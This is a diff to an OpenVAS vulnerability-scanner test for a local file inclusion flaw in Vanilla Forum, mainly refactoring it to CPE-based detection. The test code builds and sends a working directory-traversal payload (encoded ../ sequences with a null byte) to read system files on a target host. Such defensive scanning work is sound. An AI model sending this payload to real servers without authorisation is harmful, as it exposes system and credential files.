@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vanilla_forum_lfi_vuln.nasl 11188 2018-09-03 11:04:26Z cfischer $
+# $Id: gb_vanilla_forum_lfi_vuln.nasl 11235 2018-09-05 08:57:41Z cfischer $
 #
 # Vanilla Forum Local File Inclusion Vulnerability
 #
@@ -24,11 +24,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
+CPE = "cpe:/a:lussumo:vanilla";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801794");
-  script_version("$Revision: 11188 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:04:26 +0200 (Mon, 03 Sep 2018) $");
+  script_version("$Revision: 11235 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-05 10:57:41 +0200 (Wed, 05 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
@@ -38,7 +40,7 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("gb_lussumo_vanilla_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("Lussumo/Vanilla/detected");
 
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17295/");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/101448");
@@ -55,8 +57,8 @@ if(description)
   'index.php' via 'p' parameter, which allows attackers to read arbitrary files via a ../(dot dot) sequences.");
 
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
-Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
 
   script_tag(name:"summary", value:"This host is running Vanilla Forum and is prone to local file
   inclusion vulnerability.");
@@ -67,29 +69,26 @@ General solution options are to upgrade to a newer release, disable respective f
   exit(0);
 }
 
-include("misc_func.inc");
 include("http_func.inc");
-include("version_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-vfPort = get_http_port(default:80);
-if(!path = get_dir_from_kb(port:vfPort, app:"Lussumo/Vanilla")){
-  exit(0);
-}
-
-if(path == "/") path = "";
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
 files = traversal_files();
-foreach file (keys(files)){
 
-  url = string(path, "/index.php?p=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c", files[file], "%00");
+foreach file( keys( files ) ) {
 
-  if(http_vuln_check(port:vfPort, url:url, pattern:file)){
-    report = report_vuln_url(port:vfPort, url:url);
-    security_message(port:vfPort, data:report);
-    exit(0);
+  url = dir + "/index.php?p=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + files[file] + "%00";
+
+  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-exit(99);
+exit( 99 );
